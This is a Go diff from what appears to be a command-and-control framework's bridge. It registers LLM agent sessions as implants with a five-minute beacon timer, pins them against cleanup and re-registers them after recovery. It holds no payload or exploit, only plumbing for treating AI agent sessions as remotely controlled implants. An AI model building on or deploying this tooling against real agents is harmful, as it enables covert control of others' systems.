@@ -18,21 +18,47 @@ func (b *Bridge) onNewSession(sess *sessions.Session) {
 	}
 
 	info := parseUserAgentFull(sess.UserAgent)
+	if err := b.registerSessionRPC(sess, info); err != nil {
+		log.Errorf("[bridge] failed to register session %s: %v", sess.ID, err)
+		b.registered.Delete(sess.ID)
+		return
+	}
+
+	// Pin session so the local session manager won't garbage collect it.
+	sessions.Global().PinSession(sess.ID)
+
+	// Notify any goroutines waiting for this session (e.g. modules dispatched
+	// before the session was registered).
+	b.notifySessionReady(sess.ID)
+
+	// Start observing this session's events.
+	go b.observeSession(sess.ID)
+}
+
+func (b *Bridge) registerSessionRPC(sess *sessions.Session, info agentInfo) error {
+	// Use detected agent type as name if available (more accurate than UA parsing).
+	agentName := info.name
+	if sess.Agent != "" {
+		agentName = string(sess.Agent)
+	}
 
 	registerData := &implantpb.Register{
-		Name:   info.name,
+		Name:   agentName,
 		Module: b.registry.Names(),
+		Timer: &implantpb.Timer{
+			Expression: "0 */5 * * * *",
+		},
 		Sysinfo: &implantpb.SysInfo{
 			Os: &implantpb.Os{
 				Name:     info.osName,
 				Version:  info.osVersion,
 				Arch:     info.arch,
-				Release:  info.name + "/" + info.version,
+				Release:  agentName + "/" + info.version,
 				Hostname: hostName(),
-				Username: info.name + "/" + info.version,
+				Username: agentName + "/" + info.version,
 			},
 			Process: &implantpb.Process{
-				Name: info.name,
+				Name: agentName,
 				Path: sess.Format,
 			},
 		},
@@ -43,21 +69,25 @@ func (b *Bridge) onNewSession(sess *sessions.Session) {
 		PipelineId:   b.pipelineID,
 		ListenerId:   b.listenerID,
 		RegisterData: registerData,
-		Target:       "llm-agent://" + info.name,
+		Target:       "llm-agent://" + agentName,
 	})
 	if err != nil {
-		log.Errorf("[bridge] failed to register session %s: %v", sess.ID, err)
-		b.registered.Delete(sess.ID)
-		return
+		return err
 	}
-	log.Infof("[bridge] registered session %s (%s, os=%s %s %s)", sess.ID, info.name, info.osName, info.osVersion, info.arch)
+	log.Infof("[bridge] registered session %s (%s, agent=%s, os=%s %s %s)", sess.ID, agentName, sess.Agent, info.osName, info.osVersion, info.arch)
+	return nil
+}
 
-	// Notify any goroutines waiting for this session (e.g. modules dispatched
-	// before the session was registered).
-	b.notifySessionReady(sess.ID)
-
-	// Start observing this session's events.
-	go b.observeSession(sess.ID)
+func (b *Bridge) reregisterSessions() {
+	for _, summary := range sessions.Global().List() {
+		sess := sessions.Global().Get(summary.ID)
+		if sess == nil {
+			continue
+		}
+		if err := b.registerSessionRPC(sess, parseUserAgentFull(sess.UserAgent)); err != nil {
+			log.Warnf("[bridge] failed to re-register session %s during recovery: %v", sess.ID, err)
+		}
+	}
 }
 
 // agentInfo holds parsed User-Agent metadata.
